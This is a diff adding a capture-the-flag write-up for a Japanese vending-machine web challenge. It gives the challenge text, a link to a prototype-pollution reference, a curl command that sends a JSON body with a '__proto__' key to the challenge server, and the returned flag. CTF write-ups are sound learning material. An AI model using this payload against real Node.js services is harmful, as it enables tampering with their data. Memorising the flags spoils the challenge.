@@ -1061,7 +1061,30 @@ he2022{wh4dy4_m3an_32_b1t5_1s_1n53cur3}
 
 ### 自動販売機
 
-TODO
+**Challenge**
+
+I like these Japanese vending machines! ๑(◕‿◕)๑
+
+If I could just get a 🚩...
+
+http://46.101.107.117:2210
+
+Note: The service is restarted every hour at x:00.
+
+**Solution**
+
+Based on some chatter in discord, we used the attack described here: [https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution)
+
+```bash
+$ curl --silent 'http://46.101.107.117:2210/order' -X POST -H 'Content-Type: application/json' --data-raw '{"__proto__": {"amount": 6, "item": "🚩"}}'
+お楽しみください 🚩: he2022{p0llut10n_41nt_g00d}%
+```
+
+**Egg**
+
+```
+he2022{p0llut10n_41nt_g00d}
+```
 
 ### Dingos!
 
